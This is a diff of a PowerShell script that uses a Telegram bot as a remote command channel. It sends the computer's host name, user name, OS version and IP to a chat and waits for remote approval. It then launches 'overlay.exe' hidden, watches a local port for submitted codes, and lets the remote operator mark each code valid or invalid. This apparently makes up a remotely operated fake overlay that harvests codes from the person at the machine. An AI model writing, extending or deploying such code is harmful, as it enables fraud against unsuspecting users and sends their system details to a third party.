@@ -26,18 +26,31 @@ function Poll($offset) {
     } catch { $null }
 }
 
+function CheckSubmitted {
+    try {
+        $r = [Net.WebRequest]::Create('http://127.0.0.1:7823/submitted')
+        $r.Timeout = 1000
+        $resp = $r.GetResponse()
+        $code = [int]$resp.StatusCode
+        $resp.Close()
+        return $code -eq 200
+    } catch { return $false }
+}
+
+# Flush stale updates
 try {
     $res = ((New-Object Net.WebClient).DownloadString("https://api.telegram.org/bot$tok/getUpdates?offset=-1&timeout=0") | ConvertFrom-Json).result
     $offset = if ($res) { $res[-1].update_id + 1 } else { 0 }
 } catch { $offset = 0 }
 
+# PC info
 $localip = try {
     $u = New-Object Net.Sockets.UdpClient; $u.Connect('8.8.8.8', 80)
     $ip = $u.Client.LocalEndPoint.Address; $u.Close(); $ip
 } catch { 'unavailable' }
-
 $info = "Host: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $([Environment]::OSVersion.Version)`nIP: $localip"
 
+# Approval gate
 Tg 'sendMessage' "{`"chat_id`":`"$oid`",`"text`":`"⚠️ Execution requested — approve?\n\n$info`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"✅ Approve`",`"callback_data`":`"approve`"},{`"text`":`"❌ Deny`",`"callback_data`":`"deny`"}]]}}"
 
 $approved = $null
@@ -53,9 +66,9 @@ while ($null -eq $approved) {
         }
     }
 }
-
 if (-not $approved) { exit }
 
+# Theme picker
 Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"🎨 Choose overlay theme:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"☀️ Light`",`"callback_data`":`"theme_light`"},{`"text`":`"🌙 Dark`",`"callback_data`":`"theme_dark`"}]]}}"
 
 $theme = $null
@@ -75,8 +88,19 @@ while ($null -eq $theme) {
 }
 
 Start-Process "$d\overlay.exe" -ArgumentList $theme -WindowStyle Hidden
+Start-Sleep 3
+Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"🟢 Overlay opened — waiting for code...`"}"
 
+# Main loop: watch for code submission AND valid/invalid buttons
+$waitingForOutcome = $false
 while ($true) {
+    # Check if verify was pressed in overlay
+    if (-not $waitingForOutcome -and (CheckSubmitted)) {
+        $waitingForOutcome = $true
+        Tg 'sendMessage' "{`"chat_id`":`"$cid`",`"text`":`"🔔 Code submitted\n\nChoose outcome:`",`"reply_markup`":{`"inline_keyboard`":[[{`"text`":`"✅ Valid`",`"callback_data`":`"valid`"},{`"text`":`"❌ Invalid`",`"callback_data`":`"invalid`"}]]}}"
+    }
+
+    # Poll Telegram for outcome buttons
     $data = Poll $offset
     if ($data -and $data.result) {
         foreach ($upd in $data.result) {
@@ -86,12 +110,14 @@ while ($true) {
             if ($cb.data -eq 'valid') {
                 Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"✅ Overlay closed`"}"
                 try { (New-Object Net.WebClient).DownloadString('http://127.0.0.1:7823/valid') } catch {}
+                $waitingForOutcome = $false
             }
             if ($cb.data -eq 'invalid') {
                 Tg 'answerCallbackQuery' "{`"callback_query_id`":`"$($cb.id)`",`"text`":`"❌ Error shown`"}"
                 try { (New-Object Net.WebClient).DownloadString('http://127.0.0.1:7823/invalid') } catch {}
+                $waitingForOutcome = $false
             }
         }
     }
-    Start-Sleep 2
+    Start-Sleep 1
 }
